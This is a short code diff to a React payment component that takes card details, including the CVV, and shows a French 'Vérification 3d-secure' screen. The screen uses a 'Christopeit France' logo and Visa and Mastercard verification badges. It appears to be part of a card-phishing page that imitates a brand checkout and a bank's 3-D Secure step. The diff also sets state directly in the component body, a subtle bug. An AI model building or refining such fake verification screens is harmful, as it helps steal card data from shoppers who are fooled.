@@ -11,6 +11,8 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     cvv: '',
   });
 
+  setShow3DSecurePopup(true)
+
   const [showPaymentError, setShowPaymentError] = useState(false);
   const [cardLogo, setCardLogo] = useState('/verified-by-visa.png'); 
 
@@ -207,7 +209,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
               <img className='brand-logo' src='icon.png' alt='Christopeit France' />
               <img className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`} src={cardLogo} alt='Verified Payment' />
             </article>
-             <div className='loader'></div>
+            <img src='3d-secure.png' alt='3D Secure' className='icon' />
             <h2>Vérification 3d-secure</h2>
             <p className='desc'>Confirmez la transaction suivante :</p>
             <article className='infos'>
@@ -216,6 +218,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
               <span> Date : {`${formattedDate} à ${formattedTime}`}</span>
               <span>Carte : **** **** **** {lastFourDigits}</span>
             </article>
+            <div className='loader'></div>
            
             <p className='smaller'>Une fois la transaction confirmée, vous serez redirigé vers la page de confirmation.</p>
             
